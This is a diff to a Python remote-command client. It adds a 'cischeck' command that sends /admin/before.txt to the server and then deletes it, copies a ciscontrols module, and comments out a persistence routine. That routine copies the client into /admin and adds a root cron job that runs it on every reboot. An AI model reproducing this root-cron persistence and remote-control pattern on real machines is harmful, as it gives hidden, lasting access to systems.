@@ -9,7 +9,7 @@ import shutil
 import psutil
 from datetime import datetime
 from crontab import CronTab
-
+import ciscontrols
 
 
 
@@ -165,14 +165,30 @@ def connection():
 			s.send(data.encode())
 
 
+		elif 'cischeck' in command:
+			cischeck(s)
+
+
+def cischeck(s):
+	path="/admin/before.txt"
+	if ciscontrols.status() and os.path.exists(path):
+		transfergrab(s,path)
+		os.remove(path)
+	else:
+		s.send("ERROR".encode())
+
+
+
 
 
 def persistence():
 	destination="/admin/client.py"
 	if not os.path.exists(destination):
 		os.mkdir("/admin")
-		source=os.getcwd()+"/"+"client.py"
-		shutil.copyfile(source, destination)
+		source1=os.getcwd()+"/"+"client.py"
+		source2=os.getcwd()+"/"+"ciscontrols.py"
+		shutil.copyfile(source1, destination)
+		shutil.copyfile(source2, "/admin/ciscontrols.py")
 		cron = CronTab(user='root')
 		job = cron.new(command='/usr/bin/python3 /admin/client.py &')
 		job.every_reboot()
@@ -191,7 +207,7 @@ def persistence():
 
 
 
-persistence()
+#persistence()
 
 
 while True:
